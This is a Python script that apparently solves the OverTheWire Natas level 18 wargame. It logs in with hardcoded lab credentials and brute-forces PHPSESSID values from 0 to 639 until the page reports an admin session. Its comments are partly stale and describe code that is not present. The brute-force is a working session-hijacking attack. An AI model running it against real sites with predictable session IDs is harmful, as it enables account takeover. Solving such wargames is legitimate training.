import os
import urllib.request as url
import urllib.parse
import string
import time

NATAS_URL = 'http://natas18.natas.labs.overthewire.org'
NATAS_USERNAME = 'natas18'
NATAS_PWD = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
PASSWORD_LENGTH = 33


def initialPageConnexion():
    '''
    Connects to the page with the given credentials. This function
    has to be called before trying anything on the webpage.
    '''
    auth_handler = url.HTTPBasicAuthHandler()
    auth_handler.add_password('Authentication required', NATAS_URL, NATAS_USERNAME, NATAS_PWD)

    opener = url.build_opener(auth_handler)
    url.install_opener(opener)

    ## This commented out tactic also works. The website accepts the Authorization header
    ## after having connected at least once 

    # request = url.Request(NATAS_URL)
    # request.add_header('Authorization', 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==')
    # output = url.urlopen(request)

    output = url.urlopen(NATAS_URL)

    # This part is not necessary. It was only to prove myself that the urllib package works
    # with open('output.html', 'w') as file:
    #     file.write(output.read().decode())


def isCorrectInput(string):
    '''
    Determines if the string is the correct id or not

        Parameters:
            string : The id
            
        Returns:
            True if the id is correct. False otherwise
    '''
    request = urllib.parse.urlencode({'username': 'admin', 'password': 'admin'})
    request = request.encode('ascii')

    post_request = url.Request(NATAS_URL, request)
    post_request.add_header('Cookie', f'PHPSESSID={string}')

    output = url.urlopen(post_request)

    html_page = output.read().decode()

    return True if html_page.find('You are an admin.') != -1 else False


if __name__ == "__main__":

    initialPageConnexion()

    ## =======================================================================================
    ## This part creates a list of letters that are in the password. I commented it out 
    ## because it takes some time to run so I want to avoid running it too often
    ## =======================================================================================

    maxid = 640

    for id in range(maxid):
        print(f'Trying id = {id}...')
        if isCorrectInput(id):
            print(f'Admin sesion id: {id}')
            break
